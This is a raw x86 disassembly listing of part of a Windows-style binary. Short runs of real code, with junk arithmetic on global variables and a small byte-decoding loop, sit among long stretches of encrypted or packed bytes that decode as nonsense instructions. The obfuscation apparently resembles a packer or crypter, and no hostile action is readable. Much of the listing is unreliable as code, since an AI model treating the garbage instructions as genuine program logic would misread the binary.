  4040b6:	std    
  4040b7:	pop    esi
  4040b8:	(bad)  
  4040b9:	fstp   QWORD PTR [esi+ebp*4+0xe]
  4040bd:	mov    al,ds:0xfef277bf
  4040c2:	pop    edx
  4040c3:	jbe    0x4040d5
  4040c5:	aas    
  4040c6:	clc    
  4040c7:	jns    0x4040e0
  4040c9:	sti    
  4040ca:	sub    esp,DWORD PTR [ebx-0x5fb371d9]
  4040d0:	sbb    DWORD PTR [ecx+edi*4],0xffffffdd
  4040d4:	jecxz  0x404057
  4040d6:	leave  
  4040d7:	(bad)  
  4040d8:	sbb    eax,0xc18b8116
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433733,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433773
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4336ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433647,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43375b
  404131:	and    DWORD PTR ds:0x433727,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43363f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433643
  404157:	or     ecx,DWORD PTR ds:0x433697
  40415d:	mov    DWORD PTR ds:0x433643,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4336f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43375b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	push   eax
  4041aa:	dec    ecx
  4041ab:	cmp    DWORD PTR [edi+0x7c7c24a8],esi
  4041b1:	stos   DWORD PTR es:[edi],eax
  4041b2:	jg     0x404230
  4041b4:	jl     0x4041c9
  4041b6:	jbe    0x40418f
  4041b8:	mov    edi,0x9fd4ad7a
  4041bd:	or     eax,0xe1675b5
  4041c2:	dec    ebx
  4041c3:	lea    edi,[ecx-0x76]
  4041c6:	ret    0x5860
  4041c9:	sbb    esi,DWORD PTR [edi]
  4041cb:	popa   
  4041cc:	sub    DWORD PTR [eax+0x2b],esp
  4041cf:	leave  
  4041d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d1:	lea    esi,[esi+0x2b8dad7b]
  4041d7:	pop    ds
  4041d8:	(bad)  
  4041d9:	mov    ah,0x12
  4041db:	dec    edx
  4041dc:	hlt    
  4041dd:	push   ebp
  4041de:	pop    ebp
  4041df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041e0:	xchg   ecx,eax
  4041e1:	int    0x17
  4041e3:	rcr    BYTE PTR ds:0x80c4ad4c,0x40
  4041ea:	mov    ecx,DWORD PTR [ecx+0x3e]
  4041ed:	pop    ebp
  4041ee:	adc    al,0x63
  4041f0:	mov    BYTE PTR [ebp+0x308f8c85],bl
  4041f6:	jecxz  0x40425b
  4041f8:	les    edi,FWORD PTR [edi+0x1dbe4c81]
  4041fe:	rcr    DWORD PTR [esi+0x50],0xbd
  404202:	rol    BYTE PTR [ecx+0x3919a1de],1
  404208:	fldenv [esi]
  40420a:	call   0x512cb2ba
  40420f:	in     eax,dx
  404210:	sbb    esi,ebp
  404212:	stos   DWORD PTR es:[edi],eax
  404213:	mov    cl,0xb4
  404215:	fs ret 
  404217:	call   0x3f14:0xf325767
  40421e:	arpl   bx,bx
  404220:	xlat   BYTE PTR ds:[ebx]
  404221:	ror    BYTE PTR [edi-0x22],0xa4
  404225:	lea    esp,[ebx]
  404227:	adc    ebx,DWORD PTR [eax]
  404229:	outs   dx,BYTE PTR ds:[esi]
  40422a:	adc    eax,0x30eea166
  40422f:	es jecxz 0x4041ff
  404232:	call   0xe6b4:0x95101d60
  404239:	xor    al,0xaf
  40423c:	mov    dl,0x22
  40423e:	dec    edx
  40423f:	dec    eax
  404240:	mov    DWORD PTR cs:[esi+ecx*4-0x5b],ecx
  404245:	jae    0x404226
  404247:	call   0xbe51efdb
  40424c:	xchg   edx,eax
  40424d:	cli    
  40424e:	sub    DWORD PTR [edi+edi*8+0x28c2aef2],0xffffffdb
  404256:	stos   DWORD PTR es:[edi],eax
  404257:	mov    WORD PTR ds:0x9f4e,ds
  40425c:	lods   al,BYTE PTR ds:[esi]
  40425d:	sbb    ch,BYTE PTR [ebx]
  40425f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404260:	pop    ecx
  404261:	or     eax,0xf076ac2b
  404266:	(bad)  
  404268:	pop    ebp
  404269:	sar    DWORD PTR [ecx-0x44],cl
  40426c:	nop
  40426d:	add    ebx,esi
  40426f:	jns    0x4042b5
  404271:	sar    ebp,1
  404273:	dec    esp
  404274:	rcr    BYTE PTR ds:0x192e71d2,0xf6
  40427b:	rcl    edi,0xc9
  40427e:	icebp  
  40427f:	aas    
  404280:	fiadd  WORD PTR [ebp+0x6b]
  404283:	(bad)  
  404284:	xor    al,0x21
  404286:	or     eax,0xabbd40fb
  40428b:	sti    
  40428c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40428d:	call   0x29f2:0x636e8847
  404294:	inc    BYTE PTR [ebx]
  404296:	push   ds
  404297:	in     eax,0xcf
  404299:	enter  0x8838,0xf2
  40429d:	arpl   WORD PTR [edx+0x38],bp
  4042a0:	cmp    al,0xa6
  4042a2:	retf   
  4042a3:	lods   eax,DWORD PTR ds:[esi]
  4042a4:	int3   
  4042a5:	jecxz  0x4042bb
  4042a7:	jns    0x4042e9
  4042a9:	and    al,0x55
  4042ab:	push   es
  4042ac:	test   eax,0x8f364ef2
  4042b1:	repz repnz dec ebp
  4042b4:	lds    esi,FWORD PTR [esi]
  4042b6:	fld    QWORD PTR [eax+0x25eb9c64]
  4042bc:	shl    DWORD PTR [edi+eax*2+0x38],cl
  4042c0:	lods   eax,DWORD PTR ds:[esi]
  4042c1:	dec    esp
  4042c2:	jge    0x4042b1
  4042c4:	les    ebp,FWORD PTR [esi+edi*8+0x26c7dc97]
  4042cb:	sbb    BYTE PTR [edx],0x6
  4042ce:	bound  eax,QWORD PTR [ebp+ebp*8-0x6d]
  4042d2:	lea    edx,[ebx-0x35]
  4042d5:	ds loope 0x40427d
  4042d8:	jmp    0xc21a160a
  4042dd:	call   0x2d5dcdd8
  4042e2:	pop    edi
  4042e3:	ds pushf 
  4042e5:	sub    ah,BYTE PTR [edi+0x48]
  4042e8:	scas   al,BYTE PTR es:[edi]
  4042e9:	rcr    BYTE PTR [esi],1
  4042eb:	in     eax,dx
  4042ec:	xchg   edi,eax
  4042ed:	frstor [esi+0x48a20242]
  4042f3:	add    ebp,ebp
  4042f5:	xchg   DWORD PTR [edx-0x4e],eax
  4042f8:	mov    WORD PTR [esp+0x7e],dx
  4042fd:	mov    al,ds:0xdaacb553
  404302:	aad    0xbc
  404304:	mov    eax,0x4b1b5b57
  404309:	xor    eax,0x5be75a04
  40430e:	jae    0x4042c6
  404310:	clc    
  404311:	imul   ebp,DWORD PTR [esi],0xffffff85
  404314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404315:	xchg   ebx,eax
  404316:	mov    ds:0x34101c29,eax
  40431b:	xchg   edi,eax
  40431c:	dec    eax
  40431d:	mov    ebp,DWORD PTR [ebp-0x53e6b981]
  404323:	mov    edi,0x5ce0d9b2
  404328:	les    edi,FWORD PTR [eax+ecx*4+0x4baa5346]
  40432f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404330:	inc    esp
  404331:	fxch   st(1)
  404333:	pop    ebp
  404334:	mov    al,ds:0xea3421ed
  404339:	clc    
  40433a:	xor    al,0x2d
  40433c:	rcl    DWORD PTR [esi-0x2d],cl
  40433f:	and    al,0x63
  404341:	jbe    0x4042e2
  404343:	daa    
  404344:	fisub  WORD PTR [eax-0x6055e3e1]
  40434a:	scas   al,BYTE PTR es:[edi]
  40434b:	sbb    eax,0xd5ea628c
  404350:	or     ebx,DWORD PTR [eax]
  404352:	lea    edi,[edi]
  404354:	inc    ecx
  404355:	cmp    BYTE PTR [edx+0x5cf44437],0x52
  40435c:	adc    DWORD PTR [ebx-0x4f],edx
  40435f:	sub    esp,DWORD PTR [edx-0x6bcbea25]
  404365:	call   0x8156:0xd6cdb15c
  40436c:	or     eax,0x43371f
  404371:	inc    ebx
  404372:	inc    esi
  404373:	add    BYTE PTR [eax],al
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43372f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43372f,0x4336ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	or     BYTE PTR [edx],dl
  4043a3:	es cs out 0x26,eax
  4043a7:	jl     0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x40435a
  4043ae:	mov    ch,ah
  4043b0:	fwait
  4043b1:	fs loope 0x404421
  4043b4:	jg     0x404375
  4043b6:	mov    bl,0x7f
  4043b8:	pop    ebp
  4043b9:	hlt    
  4043ba:	inc    edi
  4043bb:	retf   
  4043bc:	cs inc edx
  4043be:	lea    esp,[eax+0x6]
  4043c1:	scas   eax,DWORD PTR es:[edi]
  4043c2:	ficom  DWORD PTR [ecx+0x54c6f798]
  4043c8:	jns    0x404382
  4043ca:	aas    
  4043cb:	pop    edi
  4043cc:	sar    BYTE PTR [eax+0xd7c8a04],0x86
  4043d3:	jge    0x404371
  4043d5:	(bad)  
  4043d6:	imul   DWORD PTR ds:0x817a3753
  4043dc:	mov    ebx,0xa31dec21
  4043e1:	mov    ds:0xdcba497d,eax
  4043e6:	clc    
  4043e7:	adc    DWORD PTR [ebx+eiz*1-0x1e],0xb5919ab3
  4043ef:	mov    eax,0x6fa2e750
  4043f4:	cli    
  4043f5:	pop    ds
  4043f6:	sub    DWORD PTR [esp+eax*4-0x1c],0x88469310
  4043fe:	sbb    DWORD PTR [ecx],eax
  404400:	push   esi
  404401:	loopne 0x404446
  404403:	sbb    eax,0x498d022b
  404408:	pusha  
  404409:	mov    dh,0xcb
  40440b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40440c:	push   esi
  40440d:	add    edx,ebp
  40440f:	pusha  
  404410:	mov    BYTE PTR [edi+ebp*8],ch
  404413:	fimul  WORD PTR [edi]
  404415:	rcl    DWORD PTR [edx+0x41848670],1
  40441b:	adc    ebp,DWORD PTR [edx]
  40441d:	xor    BYTE PTR [edx],dh
  40441f:	mov    edx,0x393ce904
  404424:	pusha  
  404425:	adc    al,0xa9
  404427:	inc    ecx
  404428:	psadbw mm3,QWORD PTR [eax+0x2013bb51]
  40442f:	xor    dh,BYTE PTR [ebp+eax*8+0x5b278d6c]
  404436:	int3   
  404437:	sbb    al,0xe3
  404439:	xor    esp,DWORD PTR [esi]
  40443b:	repz inc ecx
  40443d:	mov    ds,eax
  40443f:	push   ds
  404440:	shr    edi,cl
  404442:	xor    ch,BYTE PTR [ebx]
  404444:	xchg   edx,eax
  404445:	inc    edi
  404446:	aaa    
  404447:	cmp    eax,0x29863a30
  40444c:	dec    ecx
  40444d:	test   DWORD PTR [eax-0x4df97e68],ebp
  404453:	(bad)
  404456:	aas    
  404457:	les    edi,FWORD PTR [ebx-0x71aeebf3]
  40445d:	add    DWORD PTR [ebp+0x78],0x2d
  404461:	and    BYTE PTR [ebp+ebp*4-0x5d61e99f],0x0
  404469:	sbb    DWORD PTR [eax],0x6d4404fc
  40446f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404470:	outs   dx,BYTE PTR ds:[esi]
  404471:	mov    eax,0xb5ffaa36
  404476:	xor    eax,0x9f556286
  40447b:	sahf   
  40447c:	lock mov bl,0xb3
  40447f:	add    eax,0x94aff012
  404484:	sbb    BYTE PTR [ebp+0x5b730d48],bh
  40448a:	shl    DWORD PTR [ebp+0x6f],0x26
  40448e:	pop    edi
  40448f:	js     0x404418
  404491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404492:	scas   al,BYTE PTR es:[edi]
  404493:	icebp  
  404494:	sahf   
  404495:	or     eax,0x1ce78a15
  40449a:	push   esp
  40449b:	push   cs
  40449c:	sbb    bh,ah
  40449e:	sub    al,BYTE PTR [eax-0x41]
  4044a1:	dec    ecx
  4044a2:	fucomi st,st(3)
  4044a4:	popa   
  4044a5:	jbe    0x404523
  4044a7:	pop    es
  4044a8:	mov    edi,esp
  4044aa:	xchg   DWORD PTR [edx+0x45],ecx
  4044ad:	jne    0x404483
  4044af:	in     al,dx
  4044b0:	and    esp,DWORD PTR [ecx-0x58]
  4044b3:	test   eax,0x2e7cbb04
  4044b8:	das    
  4044b9:	or     esp,esp
  4044bb:	das    
  4044bc:	pop    ebx
  4044bd:	dec    esp
  4044be:	aaa    
  4044bf:	enter  0xa682,0xb
  4044c3:	xchg   DWORD PTR [ebx+0x3bce9932],ecx
  4044c9:	test   BYTE PTR [ebp+0x75264aa6],bl
  4044cf:	mov    ebp,DWORD PTR [ecx+0x2f42b147]
  4044d5:	pusha  
  4044d6:	sub    eax,0x8ef600e7
  4044db:	xor    ecx,DWORD PTR [ebx+0x965d94e]
  4044e1:	sub    edx,DWORD PTR [ebp+0x20495926]
  4044e7:	push   esi
  4044e8:	pop    esp
  4044e9:	bound  ebx,QWORD PTR [edi+edx*4]
  4044ec:	scas   eax,DWORD PTR es:[edi]
  4044ed:	xor    BYTE PTR [ecx+edi*2-0x6b],0x69
  4044f2:	inc    esp
  4044f3:	pop    edi
  4044f4:	sbb    esi,ebp
  4044f6:	sbb    ch,BYTE PTR [ebp+0x187b2ebf]
  4044fc:	rcl    cl,0x16
  4044ff:	retf   0x7e88
  404502:	mov    edx,0x83ef1cbb
  404507:	mov    dh,0xf5
  404509:	mov    cl,0x14
  40450b:	mov    dh,0x2a
  40450d:	cmp    eax,DWORD PTR [ebx-0x14]
  404510:	push   0xffffffa0
  404512:	xchg   ebx,eax
  404513:	push   ecx
  404514:	cwde   
  404515:	fs fwait
  404517:	sub    BYTE PTR [eax-0x53467b9c],ah
  40451d:	cld    
  40451e:	icebp  
  40451f:	inc    ebx
  404520:	adc    ebx,DWORD PTR [ecx+0x6b30d691]
  404526:	or     DWORD PTR [edx-0x7d],ecx
  404529:	jb     0x40459b
  40452b:	add    al,0x39
  40452d:	jg     0x404555
  40452f:	pop    esp
  404530:	pusha  
  404531:	cmp    eax,0x66abaf51
  404536:	test   esi,ebx
  404538:	and    DWORD PTR [edx-0x70],ebp
  40453b:	mov    edx,0x7b5b6c63
  404540:	adc    eax,edi
  404542:	mov    ah,0x59
  404544:	jne    0x40450c
  404546:	add    BYTE PTR [ecx+0x76049fff],0x70
  40454d:	mov    cl,0x9c
  40454f:	loop   0x4045a6
  404551:	loopne 0x4044d7
  404553:	bound  edx,QWORD PTR [esi+0x34]
  404556:	add    bh,al
  404558:	sub    bh,BYTE PTR [ebp-0x9792e71]
  40455e:	dec    eax
  40455f:	inc    edx
  404560:	stos   BYTE PTR es:[edi],al
  404561:	pop    esp
  404562:	add    eax,esi
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4336a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433653,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xedc2aa9d
  404592:	cmp    DWORD PTR ds:0x7c2012a7,ebx
  404598:	jl     0x404545
  40459a:	jg     0x404618
  40459c:	jl     0x404537
  40459e:	mov    ecx,ss
  4045a0:	out    0xf7,eax
  4045a2:	inc    esi
  4045a3:	dec    eax
  4045a4:	outs   dx,DWORD PTR ds:[esi]
  4045a5:	fdivr  QWORD PTR [ecx+0x2e]
  4045a8:	addr16 cdq 
  4045aa:	int    0x9e
  4045ac:	push   esi
  4045ad:	loope  0x40454e
  4045af:	out    0x8b,eax
  4045b1:	imul   eax,DWORD PTR [edx],0xb23954eb
  4045b7:	in     eax,0x55
  4045b9:	ins    BYTE PTR es:[edi],dx
  4045ba:	imul   esp,DWORD PTR [esi],0x13
  4045bd:	fidivr DWORD PTR [esi-0x49ade414]
  4045c3:	lods   eax,DWORD PTR ds:[esi]
  4045c4:	mov    bh,0x87
  4045c6:	pop    edx
  4045c7:	cli    
  4045c8:	push   esp
  4045c9:	rol    DWORD PTR [edx+0x438f1177],cl
  4045cf:	mov    ebx,edx
  4045d1:	pop    esi
  4045d2:	push   cs
  4045d3:	pop    es
  4045d4:	or     eax,0xdafc3fb5
  4045d9:	push   esi
  4045da:	pushf  
  4045db:	int    0xe0
  4045dd:	cmp    DWORD PTR [edx+eiz*2],edi
  4045e0:	push   DWORD PTR [eax]
  4045e2:	repz scas eax,DWORD PTR es:[edi]
  4045e4:	(bad)  
  4045e5:	hlt    
  4045e6:	jb     0x4045db
  4045e8:	loopne 0x40461f
  4045ea:	push   ebx
  4045eb:	fidiv  WORD PTR [ecx]
  4045ed:	xor    ah,BYTE PTR [ebp+0x5dfe0f06]
  4045f3:	aaa    
  4045f4:	ins    BYTE PTR es:[edi],dx
  4045f5:	ficom  DWORD PTR [eax-0x79]
  4045f8:	adc    ebp,DWORD PTR [esi-0x4e]
  4045fb:	shl    DWORD PTR [edi-0x12],0x6a
  4045ff:	push   esp
  404600:	nop
  404601:	in     al,0xc
  404603:	sub    al,0xbe
  404605:	jecxz  0x404611
  404607:	mov    cl,BYTE PTR [eax]
  404609:	js     0x40467b
  40460b:	pop    ecx
  40460c:	lock add BYTE PTR [ecx],0x79
  404610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404611:	aad    0x84
  404613:	test   al,0x9f
  404615:	dec    ecx
  404616:	shl    DWORD PTR [esi],0x4c
  404619:	idiv   DWORD PTR [edx+0x71]
  40461c:	repnz mov esi,DWORD PTR [ebp-0x7fff3775]
  404623:	popa   
  404624:	add    DWORD PTR fs:[eax],0xdaed9811
  40462b:	jmp    0x5c53:0xdae7a51b
  404632:	mov    cl,0xbb
  404634:	inc    ecx
  404635:	pop    edx
  404636:	loope  0x404667
  404638:	lods   eax,DWORD PTR ds:[esi]
  404639:	push   ebp
  40463a:	pop    es
  40463b:	sub    BYTE PTR [ecx],0x19
  40463e:	das    
  40463f:	pop    ds
  404640:	sub    ch,BYTE PTR [esi+0x82c9473]
  404646:	in     eax,0xd7
  404648:	data16 scas al,BYTE PTR es:[edi]
  40464a:	dec    ecx
  40464b:	mov    edi,0x8738d4ce
  404650:	mov    bh,0x2c
  404652:	fwait
  404653:	int3   
  404654:	sub    al,0xbf
  404656:	cwde   
  404657:	(bad)  
  404658:	sahf   
  404659:	in     al,dx
  40465a:	push   ebp
  40465b:	xor    eax,0xa811ecda
  404660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404661:	push   ecx
  404662:	pop    ebx
  404663:	sbb    eax,0x5d9f385b
  404668:	out    0x34,eax
  40466a:	imul   ecx,DWORD PTR [edi],0x2946ec3
  404670:	enter  0xe61b,0x8a
  404674:	jle    0x40461b
  404676:	cmp    bh,BYTE PTR [eax]
  404678:	dec    esi
  404679:	das    
  40467a:	pop    edx
  40467b:	ss xor BYTE PTR ds:[esi+0x47],al
  404680:	and    eax,0xbc16c55a
  404685:	pushf  
  404686:	jg     0x4046e4
  404688:	clc    
  404689:	pop    ecx
  40468a:	ins    DWORD PTR es:[edi],dx
  40468b:	inc    eax
  40468c:	pop    esp
  40468d:	and    eax,0x1668c26b
  404692:	sti    
  404693:	test   al,0x5b
  404695:	add    eax,DWORD PTR ds:0xd4c4a47d
  40469b:	mov    BYTE PTR [ecx-0x3],ch
  40469e:	mov    ds:0xd9b2ba73,al
  4046a3:	ret    
  4046a4:	or     BYTE PTR [esi-0x26e10b22],bh
  4046aa:	inc    ecx
  4046ab:	and    DWORD PTR gs:[eax],ebp
  4046ae:	xor    ecx,esi
  4046b0:	aaa    
  4046b1:	into   
  4046b2:	das    
  4046b3:	in     al,dx
  4046b4:	inc    edx
  4046b5:	sub    eax,0xbb72c602
  4046ba:	cmp    DWORD PTR [eax+0xb21f1bf],esi
  4046c0:	aam    0x94
  4046c2:	xchg   dl,al
  4046c4:	mov    BYTE PTR gs:0xf9e3dd5f,ah
  4046cb:	push   0xb53d09f4
  4046d0:	add    ecx,esi
  4046d2:	or     ecx,eax
  4046d4:	jne    0x404745
  4046d6:	or     ecx,eax
  4046d8:	out    dx,al
  4046d9:	aad    0x75
  4046db:	(bad)  
  4046dc:	mov    BYTE PTR [ebx],cl
  4046de:	int    0xc7
  4046e0:	push   edi
  4046e1:	pushf  
  4046e2:	lea    ecx,[ecx+0x74]
  4046e5:	lea    esp,[ebx-0x7df3a6e2]
  4046eb:	mov    WORD PTR [esi-0x5b611cf0],?
  4046f1:	push   ebp
  4046f2:	div    DWORD PTR [edx-0x33]
  4046f5:	jb     0x404713
  4046f7:	sub    al,0xf8
  4046f9:	jmp    0x4046cd
  4046fb:	xchg   esp,eax
  4046fc:	or     cl,cl
  4046fe:	add    al,0xc5
  404700:	sub    al,0xc3
  404702:	int    0x7b
  404704:	mov    esi,0xd48e8dd7
  404709:	mov    al,ds:0xc04ec870
  40470e:	mov    edi,0x72a4c11
  404713:	xor    bh,ah
  404715:	inc    esp
  404716:	and    ebp,DWORD PTR [ecx-0x6f8c5b01]
  40471c:	mov    edx,0xbb200aa3
  404721:	test   al,0x50
  404723:	jge    0x404766
  404725:	shr    BYTE PTR [eax],cl
  404727:	pop    ds
  404728:	retf   
  404729:	adc    eax,0x688fdfc
  40472e:	pop    esi
  40472f:	ss push esp
  404731:	mov    ebp,0x135357ad
  404736:	pop    edx
  404737:	fs dec ebp
  404739:	mov    al,ds:0x9a359ab9
  40473e:	jbe    0x40478b
  404740:	xor    BYTE PTR [edx-0xc],al
  404743:	(bad)  
  404744:	dec    esi
  404745:	ffree  st(4)
  404747:	sbb    DWORD PTR [ebp-0x6971d938],ebp
  40474d:	fadd   QWORD PTR [ecx]
  40474f:	rcr    al,cl
  404751:	mov    BYTE PTR gs:[ebp+eax*1-0x58],dl
  404756:	inc    eax
  404757:	mov    DWORD PTR ds:0x43364f,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433757
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43363f,0x14
  40477d:	cmp    DWORD PTR ds:0x43363f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43363f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43363f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43363f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43363f,eax
  4047c3:	mov    eax,ds:0x43363f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43363f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4336e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4336d7,0x43376f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4336db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4336e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4336f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404878
  40481f:	dec    edi
  404820:	dec    esp
  404821:	test   BYTE PTR [ecx+0x23],cl
  404824:	jl     0x4048a2
  404826:	stos   DWORD PTR es:[edi],eax
  404827:	jg     0x4048a5
  404829:	jl     0x4047f2
  40482b:	lds    ebp,FWORD PTR [eax-0x5479ee96]
  404831:	enter  0xaee0,0xb2
  404835:	mov    ecx,0x5f5883f4
  40483a:	mov    eax,0xba364960
  40483f:	nop
  404840:	inc    edi
  404841:	add    al,0x5e
  404843:	es fs dec ecx
  404846:	aam    0x40
  404848:	iret   
  404849:	mov    ebx,0xaef319fd
  40484e:	ret    
  40484f:	ins    BYTE PTR es:[edi],dx
  404850:	cs jnp 0x404868
  404853:	xchg   BYTE PTR [esi-0x495579b4],dl
  404859:	xchg   esp,eax
  40485a:	test   DWORD PTR [eax+0x24c78075],eax
  404860:	jmp    0x2006:0x979e35c7
  404867:	sti    
  404868:	ds pushf 
  40486a:	dec    esp
  40486b:	retf   
  40486c:	inc    esi
  40486d:	jle    0x40489d
  40486f:	jmp    0x4048de
  404871:	lea    esp,[eax+0x7fb7f112]
  404877:	rcl    bl,1
  404879:	sub    ah,BYTE PTR [ebp-0x7e]
  40487c:	aad    0xac
  40487e:	cld    
  40487f:	mov    eax,0x2c7602ea
  404884:	fwait
  404885:	pushf  
  404886:	stos   DWORD PTR es:[di],eax
  404888:	push   0x50dcc4d4
  40488d:	fimul  WORD PTR [ecx+0x7171e160]
  404893:	mov    edi,0x4805c739
  404898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404899:	xchg   ebp,ebx
  40489b:	cmp    BYTE PTR [esi],ch
  40489d:	lock in al,0x2b
  4048a0:	or     eax,0x94441db6
  4048a5:	jecxz  0x404922
  4048a7:	sbb    BYTE PTR [edx+ecx*1-0x2b],ah
  4048ab:	sbb    ch,al
  4048ad:	mov    eax,ds:0x772b96bc
  4048b2:	push   eax
  4048b3:	xchg   ebx,eax
  4048b4:	fld    TBYTE PTR [ebx+eax*8-0x383a15a1]
  4048bb:	xchg   esp,eax
  4048bc:	iret   
  4048bd:	inc    esi
  4048be:	jmp    0xb7bf:0x644c21aa
  4048c5:	dec    ebx
  4048c6:	not    cl
  4048c8:	aad    0xc6
  4048ca:	(bad)  
  4048cb:	jg     0x4048c4
  4048cd:	ja     0x4048c5
  4048cf:	xchg   edi,eax
  4048d0:	fidiv  WORD PTR [ebp-0x1f]
  4048d3:	sahf   
  4048d4:	gs retf 0x143b
  4048d8:	sub    al,0x90
  4048da:	add    al,0xac
  4048dc:	xchg   edi,eax
  4048dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048de:	jnp    0x404891
  4048e0:	lahf   
  4048e1:	jmp    0x522d692e
  4048e6:	daa    
  4048e7:	mov    bl,0xcb
  4048e9:	scas   eax,DWORD PTR es:[edi]
  4048ea:	lock jmp 0x401e9a30
  4048f0:	pop    edx
  4048f1:	fdivr  QWORD PTR [edx]
  4048f3:	xchg   ebx,eax
  4048f4:	sub    bh,BYTE PTR [ecx]
  4048f6:	xor    al,BYTE PTR [ebx-0x24dc7124]
  4048fc:	scas   eax,DWORD PTR es:[edi]
  4048fd:	jmp    0x4048af
  4048ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404900:	into   
  404901:	inc    ecx
  404902:	call   0x39fe:0xa721114f
  404909:	mov    ch,0x17
  40490b:	(bad)  
  40490c:	cmp    BYTE PTR fs:[eax-0x70],bh
  404910:	out    dx,al
  404911:	aaa    
  404912:	fist   WORD PTR [ebx-0x6f8c2530]
  404918:	push   0x4c
  40491a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491b:	rcr    BYTE PTR [edi+eiz*8],0x3c
  40491f:	fucom  st(3)
  404921:	or     al,0xc6
  404923:	test   eax,0xd955fd93
  404928:	repnz adc bl,BYTE PTR [esi-0x7f]
  40492c:	neg    DWORD PTR [edi+0x2df2fbd0]
  404932:	jno    0x40496b
  404934:	int3   
  404935:	rol    DWORD PTR ss:[edx+0x15c9b278],cl
  40493c:	pop    esp
  40493d:	jns    0x404948
  40493f:	cmp    DWORD PTR [ebp+0x55],eax
  404942:	nop
  404943:	sub    DWORD PTR [ebx-0x35],ebp
  404946:	xchg   esi,eax
  404947:	out    0x63,al
  404949:	retf   0x79bc
  40494c:	and    DWORD PTR [esi-0x356abb9b],ebx
  404952:	inc    edi
  404953:	add    BYTE PTR [edi],bh
  404955:	fstp   DWORD PTR [edi-0x53]
  404958:	and    DWORD PTR [edi],ebp
  40495a:	scas   eax,DWORD PTR es:[edi]
